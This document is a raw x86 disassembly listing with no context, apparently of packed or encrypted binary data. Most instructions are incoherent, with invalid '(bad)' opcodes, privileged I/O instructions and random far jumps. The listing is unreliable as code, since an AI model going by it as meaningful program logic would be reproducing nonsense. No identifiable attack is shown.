  42f909:	pop    ebx
  42f90a:	loope  0x42f979
  42f90c:	daa    
  42f90d:	xchg   esp,eax
  42f90e:	rcl    BYTE PTR [edx],cl
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9ce
  42f981:	cmc    
  42f982:	mov    ds:0x1fd78da,eax
  42f987:	add    BYTE PTR [ecx+eax*1],al
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	sbb    ecx,esp
  42f98e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f98f:	xchg   ebx,eax
  42f990:	sub    eax,0x73273b6f
  42f995:	mov    edx,0xfb714919
  42f99a:	ret    0x624d
  42f99d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f99e:	pop    ecx
  42f99f:	jns    0x42f9c0
  42f9a1:	fiadd  DWORD PTR [edx]
  42f9a3:	addr16 jnp 0x42f985
  42f9a6:	dec    esp
  42f9a7:	mov    ah,0x1b
  42f9a9:	jnp    0x42f9b0
  42f9ab:	adc    dl,ah
  42f9ad:	jbe    0x42f9f9
  42f9af:	pop    eax
  42f9b0:	cwde   
  42f9b1:	xor    bl,BYTE PTR [edx-0x3e]
  42f9b4:	dec    ebx
  42f9b5:	dec    ebp
  42f9b6:	lds    edx,FWORD PTR [ecx+0x3bd251e8]
  42f9bc:	inc    ecx
  42f9bd:	jmp    0x2e83840e
  42f9c2:	cwde   
  42f9c3:	xor    esi,DWORD PTR [esi+0x5d]
  42f9c6:	jge    0x42f9fc
  42f9c8:	xchg   edx,eax
  42f9c9:	or     ebp,DWORD PTR [ebx-0x38d3cb82]
  42f9cf:	shl    BYTE PTR [ecx],cl
  42f9d1:	or     dh,BYTE PTR [ecx+0x3d]
  42f9d4:	fbstp  TBYTE PTR [eax]
  42f9d6:	sbb    dh,BYTE PTR [ebx]
  42f9d8:	cmp    bl,BYTE PTR [ebx-0xee5ee6b]
  42f9de:	shl    BYTE PTR [ebx+0x26],0x87
  42f9e2:	or     al,0xf7
  42f9e4:	ja     0x42f9ed
  42f9e6:	sbb    ebx,ebp
  42f9e8:	out    dx,eax
  42f9e9:	pop    esp
  42f9ea:	and    DWORD PTR [edi+edx*4],edi
  42f9ed:	and    BYTE PTR [esi-0x26ded47c],al
  42f9f3:	pop    ss
  42f9f4:	enter  0x432e,0xe8
  42f9f8:	pop    ss
  42f9f9:	loop   0x42fa72
  42f9fb:	fwait
  42f9fc:	adc    al,0x2e
  42f9fe:	dec    esp
  42f9ff:	cdq    
  42fa00:	inc    esp
  42fa01:	test   al,0x29
  42fa03:	inc    esp
  42fa04:	retf   
  42fa05:	data16 jbe 0x42fa5d
  42fa08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa09:	xor    dh,BYTE PTR [ebx-0x264382f]
  42fa0f:	xchg   DWORD PTR ds:0x9f8f05ca,ecx
  42fa15:	sub    al,0xb2
  42fa17:	out    dx,al
  42fa18:	sbb    bl,0xaa
  42fa1b:	clc    
  42fa1c:	inc    edi
  42fa1d:	cli    
  42fa1e:	add    BYTE PTR [edi-0x80],ah
  42fa21:	popf   
  42fa22:	std    
  42fa23:	jg     0x42f9aa
  42fa25:	adc    eax,DWORD PTR [ecx-0x3db66248]
  42fa2b:	sti    
  42fa2c:	mov    dh,BYTE PTR [esi]
  42fa2e:	out    dx,al
  42fa2f:	push   0xffffffdc
  42fa31:	jbe    0x42faa3
  42fa33:	mov    eax,ds:0x4ccf1b4f
  42fa38:	jl     0x42fa53
  42fa3a:	fstp   TBYTE PTR [ecx-0x46]
  42fa3d:	das    
  42fa3e:	out    dx,eax
  42fa3f:	leave  
  42fa40:	aam    0x9
  42fa42:	inc    ecx
  42fa43:	inc    esi
  42fa44:	into   
  42fa45:	fadd   DWORD PTR [ebx]
  42fa47:	sahf   
  42fa48:	mov    eax,ds:0x5a0cecaf
  42fa4d:	sysexit 
  42fa4f:	clc    
  42fa50:	mov    bh,dl
  42fa52:	out    dx,al
  42fa53:	or     ebp,DWORD PTR [ebp-0x791fba4e]
  42fa59:	adc    ah,BYTE PTR [ebx]
  42fa5b:	pop    ds
  42fa5c:	mov    dh,0xcf
  42fa5e:	(bad)
  42fa61:	jg     0x42fa5e
  42fa63:	icebp  
  42fa64:	nop
  42fa65:	adc    eax,0xf8f41c59
  42fa6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa6b:	add    DWORD PTR ds:0xd272e2bb,ebp
  42fa71:	jmp    0x8207:0xaa7ca9cd
  42fa78:	call   0x32e9:0xc4dc636a
  42fa7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa80:	and    al,0xd8
  42fa82:	add    DWORD PTR [edx-0x27],esi
  42fa85:	push   esp
  42fa86:	aad    0xc6
  42fa88:	imul   ebp,DWORD PTR [eax],0x46853437
  42fa8e:	ins    DWORD PTR es:[edi],dx
  42fa8f:	add    al,0x0
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	shl    DWORD PTR [ebx+0x9],1
  42fb03:	adc    edi,DWORD PTR [esi+edi*8+0x1]
  42fb07:	add    BYTE PTR [ecx+eax*1],al
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	mov    bl,0x8a
  42fb0e:	outs   dx,BYTE PTR ds:[esi]
  42fb0f:	jnp    0x42fb2f
  42fb11:	push   esp
  42fb12:	test   eax,0x60e1759e
  42fb17:	push   ecx
  42fb18:	ficomp WORD PTR [esi]
  42fb1b:	ins    BYTE PTR es:[edi],dx
  42fb1c:	or     eax,0xafac5ea8
  42fb21:	daa    
  42fb22:	stos   DWORD PTR es:[edi],eax
  42fb23:	mov    cl,dh
  42fb25:	loopne 0x42fb1c
  42fb27:	sbb    dl,BYTE PTR [edi]
  42fb29:	inc    esi
  42fb2a:	sti    
  42fb2b:	shl    DWORD PTR [edi+eax*1+0xf],cl
  42fb2f:	push   edi
  42fb30:	adc    eax,0x927eba18
  42fb35:	add    DWORD PTR [ebp-0x68],ebp
  42fb38:	dec    ebp
  42fb39:	inc    edi
  42fb3a:	jmp    0xe8d5:0xfafed771
  42fb41:	mov    ebx,0x9081c55a
  42fb46:	push   ss
  42fb47:	ror    BYTE PTR [edi+0x7e],0x92
  42fb4b:	das    
  42fb4c:	mov    ecx,0xdb0f27ee
  42fb51:	jle    0x42fb04
  42fb53:	das    
  42fb54:	pop    esp
  42fb56:	xchg   ecx,eax
  42fb57:	out    0xf7,al
  42fb59:	xor    DWORD PTR ds:0xe4e07f80,0xf
  42fb60:	pop    es
  42fb61:	and    al,0xd0
  42fb63:	push   ds
  42fb64:	sbb    eax,0x92937625
  42fb69:	add    BYTE PTR [ebx+0x1e],ah
  42fb6c:	adc    BYTE PTR ds:0x7dc8b5e9,cl
  42fb72:	pop    edi
  42fb73:	jp     0x42fb7d
  42fb75:	imul   esi,DWORD PTR [eax+0x7f],0x646c20
  42fb7c:	jle    0x42fb24
  42fb7e:	jbe    0x42fb8c
  42fb80:	sti    
  42fb81:	dec    eax
  42fb82:	mov    esi,0x698d8ffa
  42fb87:	sub    edx,DWORD PTR [ebp+0x6425b09]
  42fb8d:	psubusw mm0,QWORD PTR [edi-0x7cbb50c2]
  42fb94:	sbb    eax,0x8ad1324a
  42fb99:	xchg   ecx,eax
  42fb9a:	and    eax,0x1946d2f7
  42fb9f:	mov    cl,0x1a
  42fba1:	cmp    esp,DWORD PTR [ecx]
  42fba3:	or     ebx,DWORD PTR gs:[esi+0x6c]
  42fba7:	lods   al,BYTE PTR ds:[esi]
  42fba8:	shl    eax,0xd7
  42fbab:	sbb    eax,0xc3f19230
  42fbb0:	and    DWORD PTR [edi-0x1c],0xffffffff
  42fbb4:	fstp   DWORD PTR [ecx]
  42fbb6:	aaa    
  42fbb7:	xchg   edi,eax
  42fbb8:	mov    esp,0xd78c3039
  42fbbd:	(bad)  
  42fbbf:	(bad)  
  42fbc0:	cmp    eax,0x3170c62c
  42fbc5:	xchg   DWORD PTR [eax+0x54804055],edi
  42fbcb:	sub    al,0x72
  42fbcd:	repz sbb BYTE PTR [ebx],ch
  42fbd0:	jp     0x42fbc5
  42fbd2:	out    dx,eax
  42fbd3:	and    dh,BYTE PTR [ebp-0x79]
  42fbd6:	gs scas eax,DWORD PTR es:[edi]
  42fbd8:	pop    edx
  42fbd9:	add    BYTE PTR [edx+esi*1],ah
  42fbdc:	pop    es
  42fbdd:	push   DWORD PTR [edx-0x772d0f3c]
  42fbe3:	mov    al,ds:0x306971df
  42fbe8:	jb     0x42fbb1
  42fbea:	inc    edx
  42fbeb:	lods   al,BYTE PTR ds:[esi]
  42fbec:	call   0xf0a1:0x718bbe0f
  42fbf3:	dec    eax
  42fbf4:	ins    BYTE PTR es:[edi],dx
  42fbf5:	add    al,0x1c
  42fbf7:	mov    eax,ds
  42fbf9:	retf   0x7e34
  42fbfc:	xchg   ebp,eax
  42fbfd:	test   DWORD PTR [ebp-0x48],edi
  42fc00:	mov    edi,0x58cc647e
  42fc05:	and    al,0x3b
  42fc07:	(bad)  
  42fc08:	out    dx,eax
  42fc09:	push   edi
  42fc0a:	jb     0x42fbe2
  42fc0c:	hlt    
  42fc0d:	test   BYTE PTR [ebx-0x41],al
	...
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [eax+ecx*1-0x3e],al
  42fc83:	daa    
  42fc84:	cmp    bh,0x1
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	mov    ecx,0x786e97b2
  42fc91:	cmp    BYTE PTR [edx-0x31ee3a52],cl
  42fc97:	arpl   WORD PTR [ebp-0x2b72d104],cx
  42fc9d:	das    
  42fc9e:	pop    edx
  42fc9f:	jno    0x42fc6f
  42fca1:	or     eax,0x855c9f93
  42fca6:	cmp    eax,0xcb9cd0d0
  42fcab:	mov    al,ds:0xe8e9da22
  42fcb0:	dec    esi
  42fcb1:	clc    
  42fcb2:	xchg   BYTE PTR [edx-0x22],dl
  42fcb5:	jae    0x42fc4e
  42fcb7:	jmp    0x42fc82
  42fcb9:	xchg   ebp,eax
  42fcba:	leave  
  42fcbb:	dec    esp
  42fcbc:	xchg   DWORD PTR ds:[ebp+0x3b],ebx
  42fcc0:	jge    0x42fcad
  42fcc2:	aaa    
  42fcc3:	sub    DWORD PTR [eax],esi
  42fcc5:	ret    
  42fcc6:	xchg   esi,eax
  42fcc7:	inc    edx
  42fcc9:	scas   eax,DWORD PTR es:[edi]
  42fcca:	vandps ymm3,ymm0,YMMWORD PTR [edi-0xa]
  42fccf:	cwde   
  42fcd0:	nop    edi
  42fcd3:	mov    gs,WORD PTR [ebx-0x5b]
  42fcd6:	xchg   BYTE PTR [ebx],cl
  42fcd8:	stos   BYTE PTR es:[edi],al
  42fcd9:	add    BYTE PTR [ebx+ebx*8],ch
  42fcdc:	dec    ecx
  42fcdd:	pop    ebx
  42fcde:	cmp    DWORD PTR [esi+eax*4+0x25783207],ebx
  42fce5:	mov    edi,0xf8e8f92c
  42fcea:	xor    eax,0x4e742032
  42fcef:	xor    eax,0xd38437da
  42fcf4:	jecxz  0x42fca1
  42fcf6:	sbb    dh,bl
  42fcf8:	jmp    0x42fc83
  42fcfa:	lea    edx,[eax+edx*4+0x64]
  42fcfe:	hlt    
  42fcff:	mov    ds:0x3ba4a41c,al
  42fd04:	or     al,0x49
  42fd06:	and    DWORD PTR [ecx+0xece1040],ecx
  42fd0c:	and    esi,0x994441bd
  42fd12:	mov    ebp,0x696526d8
  42fd17:	or     edx,DWORD PTR [esi+0x593fdc7c]
  42fd1d:	add    esi,DWORD PTR [ecx+0x1c]
  42fd20:	pop    edx
  42fd21:	out    dx,al
  42fd22:	sub    eax,0x874d391d
  42fd27:	sbb    eax,0x9e86221a
  42fd2c:	pop    ebx
  42fd2d:	ret    
  42fd2e:	cmp    al,0x18
  42fd30:	andnps xmm7,XMMWORD PTR [edx-0x14]
  42fd34:	xor    DWORD PTR [eax-0x4ce71988],eax
  42fd3a:	xchg   ebp,eax
  42fd3b:	jmp    0x5ec0b2c
  42fd40:	loopne 0x42fccc
  42fd42:	invd   
  42fd44:	add    DWORD PTR [esi-0x9],edi
  42fd47:	or     edx,DWORD PTR [esi+0x20]
  42fd4a:	cmp    eax,edi
  42fd4c:	dec    edi
  42fd4d:	ins    DWORD PTR es:[di],dx
  42fd4f:	or     eax,0x3d4f05cd
  42fd54:	test   al,0x60
  42fd56:	aad    0x13
  42fd58:	nop
  42fd59:	adc    DWORD PTR [ebx],esp
  42fd5b:	repnz inc ecx
  42fd5d:	push   edx
  42fd5e:	je     0x42fd13
  42fd60:	add    al,0xea
  42fd62:	lahf   
  42fd63:	sbb    BYTE PTR [eax+0x2faa85de],ah
  42fd69:	add    ebx,0x327be158
  42fd6f:	xor    BYTE PTR [edx+0x7b],bh
  42fd72:	addr16 montmul (bad)
  42fd74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd75:	inc    ebp
  42fd76:	mov    esp,0x28a2ab97
  42fd7b:	call   0x5d1b:0x3b629d12
  42fd82:	clc    
  42fd83:	call   0xee2864f2
  42fd88:	pop    eax
  42fd89:	jnp    0x42fd8a
  42fd8b:	in     al,0xf5
  42fd8d:	pop    edx
  42fd8e:	rcr    BYTE PTR [ecx+0x0],1
	...
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz cmc 
  42fe01:	and    eax,esi
  42fe03:	xor    eax,0x20084
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	mov    dh,0xf0
  42fe0e:	cs call 0xd7d3:0x4bc5a903
  42fe16:	jb     0x42fdc8
  42fe18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe19:	mov    ch,0x12
  42fe1b:	add    ah,BYTE PTR [ecx-0x2249ce41]
  42fe21:	dec    esp
  42fe22:	fs lahf 
  42fe24:	xor    edx,DWORD PTR [ecx+0x6bb5b35a]
  42fe2a:	out    0xb4,al
  42fe2c:	or     ebx,ecx
  42fe2e:	jnp    0x42fe4f
  42fe30:	test   BYTE PTR [edi-0x22],bl
  42fe33:	push   0x8fdb88d5
  42fe38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe39:	and    BYTE PTR [ecx+0x25],dl
  42fe3c:	sti    
  42fe3d:	push   edi
  42fe3e:	fld1   
  42fe40:	xlat   BYTE PTR ds:[ebx]
  42fe41:	jmp    0x42fe9d
  42fe43:	sbb    cl,BYTE PTR [eax]
  42fe45:	sahf   
  42fe46:	mov    cl,0x47
  42fe48:	mov    cl,0x26
  42fe4a:	and    BYTE PTR [ebx+ebp*2-0x22],dl
  42fe4e:	jp     0x42fe19
  42fe50:	retf   
  42fe51:	jb     0x42fe0a
  42fe53:	sti    
  42fe54:	out    0xd6,al
  42fe56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe57:	sub    bh,BYTE PTR [edi+ecx*4]
  42fe5a:	mov    ah,0x8e
  42fe5c:	mov    eax,ds:0xb74acea
  42fe61:	mov    esi,0x9cd95877
  42fe66:	jae    0x42fe42
  42fe68:	and    eax,0xc52cd747
  42fe6d:	inc    ebx
  42fe6e:	scas   al,BYTE PTR es:[edi]
  42fe6f:	pop    edx
  42fe70:	and    dl,BYTE PTR [ebp+edx*1-0x21db7185]
  42fe77:	loopne 0x42fe6f
  42fe79:	ret    
  42fe7a:	cs sbb eax,0x3e7d536a
  42fe80:	loop   0x42fe67
  42fe82:	cwde   
  42fe83:	lods   al,BYTE PTR fs:[esi]
  42fe85:	jmp    0x374d:0x497c7875
  42fe8c:	out    0xac,al
  42fe8e:	inc    ebp
  42fe8f:	mov    bh,0xe1
  42fe91:	cwde   
  42fe92:	sub    bl,dh
  42fe94:	sahf   
  42fe95:	xor    edx,DWORD PTR [edx-0x4b]
  42fe98:	(bad)  
  42fe99:	mov    WORD PTR [ecx+eax*1+0x32],?
  42fe9d:	daa    
  42fe9e:	(bad)  
  42fe9f:	push   ecx
  42fea0:	mov    eax,ds:0x61cf08d6
  42fea5:	fcomp  st(2)
  42fea7:	rcl    ebx,1
  42fea9:	popf   
  42feaa:	or     dl,dh
  42feac:	jp     0x42fe8a
  42feae:	push   ebp
  42feaf:	and    BYTE PTR [ebp+0x16a24968],ch
  42feb5:	in     eax,0x8f
  42feb7:	stos   BYTE PTR es:[edi],al
  42feb8:	xchg   esi,eax
  42feb9:	push   esp
  42feba:	pop    edi
  42febb:	(bad)
  42fec0:	sub    bh,BYTE PTR [edx-0x34cb7a9a]
  42fec6:	pushf  
  42fec7:	icebp  
  42fec8:	mov    eax,0xdcb958a1
  42fecd:	pop    es
  42fece:	sbb    eax,0x68ba49e2
  42fed3:	push   edi
  42fed4:	push   ds
  42fed5:	dec    edx
  42fed6:	pop    ebp
  42fed7:	inc    edx
  42fed8:	push   edi
  42fed9:	xor    eax,DWORD PTR [edi+edx*8+0x12]
  42fedd:	loopne 0x42fed5
  42fedf:	sbb    edx,ecx
  42fee1:	pop    ebx
  42fee2:	ss ins BYTE PTR es:[edi],dx
  42fee4:	or     al,0x88
  42fee6:	aad    0xc8
  42fee8:	push   ebx
  42fee9:	shl    BYTE PTR [ecx+0x3a],0x18
  42feed:	mov    sp,0x9aef
  42fef1:	ja     0x42fe9a
  42fef3:	lea    edx,[ebx-0x18]
  42fef6:	ds in  eax,0xab
  42fef9:	sbb    eax,0xdfb0b05c
  42fefe:	add    al,0xc7
  42ff00:	mov    dh,0x42
  42ff02:	imul   esp,DWORD PTR [ebp-0x1206ff2d],0x0
  42ff09:	xor    eax,0x6951d769
  42ff0e:	dec    edx
  42ff0f:	jmp    0x42ff14
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ebx+ebp*4-0x4d],0xdd
  42ff83:	jmp    0x104:0x20188
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	jp     0x42ffa6
  42ff8e:	shl    DWORD PTR [eax+0x6c],0x73
  42ff92:	out    0xba,al
  42ff94:	imul   eax,DWORD PTR [edx],0xffffffb1
  42ff97:	or     eax,0x90d17823
  42ff9c:	cmc    
  42ff9d:	dec    eax
  42ff9e:	leave  
  42ff9f:	loopne 0x42ff4a
  42ffa1:	adc    edi,ebx
  42ffa3:	test   ax,0xa7c9
  42ffa7:	inc    eax
  42ffa8:	call   0xcf929fcf
  42ffad:	or     al,0x0
  42ffaf:	fnstsw WORD PTR [edi+ebp*1+0x1818b68e]
  42ffb6:	add    DWORD PTR [edi-0x28b034e6],ecx
  42ffbc:	retf   0x4d1d
  42ffbf:	adc    bh,bh
  42ffc1:	sbb    BYTE PTR [eax],dh
  42ffc3:	rol    DWORD PTR ds:0xc06e6c06,0x93
  42ffca:	rcl    DWORD PTR [ebx+0x4d159ce0],1
  42ffd0:	jge    0x42ff9d
  42ffd2:	ss sub bl,dl
  42ffd5:	sar    DWORD PTR [ebx-0x1a55aee1],1
  42ffdb:	or     DWORD PTR [edx+0x9],edx
  42ffde:	mov    ecx,0x9f72587b
  42ffe3:	inc    edx
  42ffe4:	test   BYTE PTR [ebx+0x721349b8],ch
  42ffea:	and    cl,BYTE PTR [edx]
  42ffec:	adc    dl,BYTE PTR [edi-0x32]
  42ffef:	sti    
  42fff0:	xlat   BYTE PTR ds:[ebx]
  42fff1:	int    0xcb
  42fff3:	adc    eax,eax
  42fff5:	push   eax
  42fff6:	lods   al,BYTE PTR ds:[esi]
  42fff7:	cdq    
  42fff8:	jl     0x43004f
  42fffa:	js     0x42ff7d
  42fffc:	daa    
  42fffd:	hlt    
  42fffe:	cmp    DWORD PTR [edx-0x39],edx
  430001:	inc    ecx
  430002:	shl    cl,1
  430004:	adc    ebp,esi
  430006:	jns    0x43004b
  430008:	int3   
  430009:	push   eax
  43000a:	gs test esi,0xa5261529
  430011:	retf   0x8f0c
  430014:	pop    esi
  430015:	jae    0x42ffa2
  430017:	les    ecx,FWORD PTR [esi+edx*1-0x7d02b044]
  43001e:	call   0x3609d508
  430023:	mov    esi,DWORD PTR [edi-0x2b1bb65a]
  430029:	xor    dl,BYTE PTR [ebx+0x21]
  43002c:	cmp    edi,eax
  43002e:	pop    esp
  43002f:	clc    
  430030:	popf   
  430031:	xor    dl,al
  430033:	repz xchg esi,eax
  430035:	or     eax,ebp
  430037:	dec    edi
  430038:	pop    es
  430039:	xor    al,0x69
  43003b:	in     al,0xfc
  43003d:	sbb    dl,dl
  43003f:	cmp    eax,0x5d0ef18
  430044:	sbb    dl,cl
  430046:	mov    ch,0xa9
  430048:	sbb    edx,ebx
  43004a:	inc    eax
  43004b:	jno    0x430099
  43004d:	inc    esi
  43004e:	push   0xffffffbf
  430050:	fiadd  DWORD PTR [ecx-0x48]
  430053:	pushf  
  430054:	mul    DWORD PTR [edi+0x403e5c5b]
  43005a:	rcr    BYTE PTR [ecx-0x3cc4765c],0x94
  430061:	jnp    0x4300dc
  430063:	adc    BYTE PTR [bp+di],bl
  430066:	pop    ds
  430067:	les    edi,FWORD PTR [ebx]
  430069:	and    DWORD PTR [eax+edx*4+0x43],eax
  43006d:	cdq    
  43006e:	add    esi,edx
  430070:	enter  0xbc93,0xfd
  430074:	xor    al,0x32
  430076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430077:	cmp    esi,0xb05dfcd2
  43007d:	mov    eax,0xa5203a77
  430082:	mov    ch,0x1b
  430084:	adc    BYTE PTR [eax+edx*2-0x4bb09817],dl
  43008b:	sub    BYTE PTR [ebp+0xe2bc0d],dh
	...
  4300f1:	add    BYTE PTR [eax],al
  4300f3:	add    bh,al
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0xf
  430101:	and    DWORD PTR [ebp+0x1c],0xffffff8c
  430105:	add    al,BYTE PTR [edx]
  430107:	add    BYTE PTR [ebp+0x0],ch
  43010a:	add    BYTE PTR [eax],al
  43010c:	sbb    bh,BYTE PTR ds:0x819637dd
  430112:	and    bl,BYTE PTR [eax]
  430114:	pop    eax
  430115:	and    DWORD PTR [ecx+0x2b22120b],esp
  43011b:	imul   ebp,DWORD PTR [edx+eiz*4],0xfcb846da
  430122:	repnz out dx,eax
  430124:	out    0x54,al
  430126:	sub    edx,DWORD PTR [eax]
  430128:	xchg   esi,eax
  430129:	call   0x9b9d:0xe4667006
  430130:	sahf   
  430131:	test   DWORD PTR [ebx],eax
  430133:	and    edx,0xffffff93
  430136:	add    cl,BYTE PTR [ebx]
  430138:	in     eax,0x83
  43013a:	dec    edx
  43013b:	push   ebp
  43013c:	mov    al,ds:0xb6671a86
  430141:	dec    esi
  430142:	sbb    al,dh
  430144:	inc    esi
  430145:	cmp    esi,DWORD PTR [ecx+0x2c]
  430148:	adc    al,0xa6
  43014a:	inc    edi
  43014b:	pop    edx
  43014c:	in     eax,dx
  43014d:	fs mov edi,0xaa5d2937
  430153:	test   BYTE PTR [ecx],ch
  430155:	jmp    0x9fcbcedc
  43015a:	inc    ebx
  43015b:	jns    0x43019c
  43015d:	dec    esi
  43015e:	mov    edx,0x38086bda
  430163:	jp     0x43017e
  430165:	imul   ebp,DWORD PTR [esi-0x5],0x5ee90730
  43016c:	imul   ebp,ebp,0xffffffdf
  43016f:	and    bl,BYTE PTR [edx-0x57]
  430172:	or     ecx,0x3eec8ce0
  430178:	add    BYTE PTR gs:[eax],al
	...
  4301f3:	add    BYTE PTR [ebp+0x55],cl
  4301f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4301fc:	mov    esp,ebp
  4301fe:	or     ah,dh
  430200:	dec    ebp
  430201:	add    bh,al
  430203:	add    BYTE PTR [eax],cl
  430205:	add    BYTE PTR [eax],al
  430207:	mov    DWORD PTR [eax],0x40f44545
  43020d:	xor    DWORD PTR [eax],eax
  43020f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430215:	(bad)  
  430216:	enter  0x4d45,0xbc
  43021a:	mov    esi,DWORD PTR [edx]
  43021c:	hlt    
  43021d:	test   ebx,ecx
  43021f:	pushf  
  430220:	enter  0x4df8,0x8b
  430224:	mov    DWORD PTR [ebp+0x8],0x894708
  43022b:	inc    ebp
  43022c:	mov    ebp,0xff8bfffc
  430231:	dec    ebp
  430232:	mov    ch,0xf4
  430234:	call   DWORD PTR [ebx-0x1]
  430237:	mov    ebx,0x8005474
  43023c:	call   DWORD PTR [ecx+0x8]
  43023f:	pop    es
  430240:	jmp    0xb8:0xacb4533
  430247:	fwait
  430248:	mov    esi,DWORD PTR [edx-0xc]
  43024b:	xor    cl,bl
  43024d:	add    BYTE PTR [ebx+0x3c83203],bl
  430253:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430259:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43025f:	xor    eax,DWORD PTR [eax]
  430261:	retf   
  430262:	retf   
  430263:	add    ecx,eax
  430265:	enter  0x894d,0x64
  430269:	dec    ebp
  43026a:	sbb    ah,cl
  43026c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430272:	dec    DWORD PTR [ebx-0xbcfb275]
  430278:	test   DWORD PTR [ebx],esi
  43027a:	dec    ebx
  43027c:	inc    DWORD PTR [ebx]
  43027e:	inc    eax
  43027f:	enter  0x8989,0x50
  430283:	(bad)  
  430284:	call   DWORD PTR [ebx+ecx*4-0x1]
  430288:	cld    
  430289:	dec    DWORD PTR [ebp-0xa90001]
  43028f:	push   edi
  430290:	mov    BYTE PTR [edx+0x1],ch
  430293:	and    al,BYTE PTR [eax]
  430295:	pop    ecx
  430296:	inc    ebp
  430297:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43029d:	push   0xffffff89
  43029f:	pop    ecx
  4302a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302a1:	dec    ebp
  4302a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4302a8:	jne    0x4302f4
  4302aa:	lea    eax,[eax]
  4302ac:	push   eax
  4302ad:	(bad)  
  4302ae:	dec    DWORD PTR [eax]
  4302b0:	mov    DWORD PTR [eax],eax
  4302b2:	test   al,0x0
  4302b4:	add    BYTE PTR [ebp-0x18],cl
  4302b7:	xor    ebp,DWORD PTR [ebx]
  4302b9:	add    eax,DWORD PTR [eax]
  4302bb:	mov    eax,eax
  4302bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302c4:	inc    ebp
  4302c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4302cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4302d1:	sub    al,0x80
  4302d3:	inc    DWORD PTR [ecx]
  4302d5:	lea    eax,[eax]
  4302d7:	or     al,0x0
  4302d9:	inc    DWORD PTR [ecx-0x18]
  4302dc:	mov    ecx,DWORD PTR [ebx]
  4302de:	cld    
  4302df:	add    BYTE PTR [ecx+0x75014d],cl
  4302e5:	(bad)  
  4302e6:	xchg   ebp,eax
  4302e7:	fdivr  st,st(7)
  4302e9:	inc    eax
  4302ea:	inc    DWORD PTR [eax]
  4302ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4302ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4302f5:	add    BYTE PTR [edx],dl
  4302f7:	enter  0x4d90,0x0
  4302fb:	mov    eax,DWORD PTR [eax]
  4302fd:	hlt    
  4302fe:	add    al,0xa5
  430300:	mov    al,0xff
  430302:	add    bh,bh
  430304:	add    BYTE PTR [ebx],dh
  430306:	inc    DWORD PTR [ebx]
  430308:	sbb    al,0x89
  43030a:	jne    0x4302e8
  43030c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430312:	mov    eax,DWORD PTR [ebp-0xff0048]
  430318:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43031f:	inc    DWORD PTR [ebp-0x75]
  430322:	fisttp QWORD PTR [esi+ebp*8]
  430325:	test   DWORD PTR [esi-0x1],esp
  430328:	inc    ebp
  430329:	(bad)  
  43032a:	aas    
  43032b:	inc    ebp
  43032c:	(bad)  
  43032d:	lea    edi,[esp+eiz*2-0x1]
  430331:	inc    edi
  430333:	mov    DWORD PTR ds:0x8000c7a0,edi
  430339:	mov    ebp,esp
  43033b:	cld    
  43033c:	loop   0x4302cb
  43033e:	inc    ebp
  43033f:	(bad)  
  430340:	out    dx,al
  430341:	(bad)  
  430342:	fisttp WORD PTR [eax+0x8801c7]
  430348:	jecxz  0x43038f
  43034a:	in     al,dx
  43034b:	inc    DWORD PTR [ebp-0x4]
  43034e:	out    0x8d,eax
  430350:	aas    
  430351:	inc    edi
  430353:	jmp    FWORD PTR [eax-0x78]
  430356:	inc    DWORD PTR [ecx]
  430358:	mov    DWORD PTR [eax],0xc7043d
  43035e:	ins    BYTE PTR es:[edi],dx
  43035f:	test   edi,edi
  430361:	pandn  mm0,mm5
  430364:	aas    
